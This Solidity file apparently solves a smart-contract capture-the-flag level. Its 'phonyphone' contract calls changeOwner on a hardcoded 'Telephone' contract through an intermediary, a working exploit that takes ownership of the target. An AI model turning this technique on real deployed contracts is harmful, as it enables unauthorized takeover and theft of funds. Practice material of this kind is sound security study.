// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

interface Telephone{
    function changeOwner(address _owner) external;
}

contract phonyphone{
    address public myAddress;
    Telephone public object=Telephone(0xA3a30058F1EcB31d0735B579588479B0B0d517b1);

    function getaddr(address _address) public{
        myAddress=_address;
    }

    function caller() public{
        object.changeOwner(myAddress);
    }
}
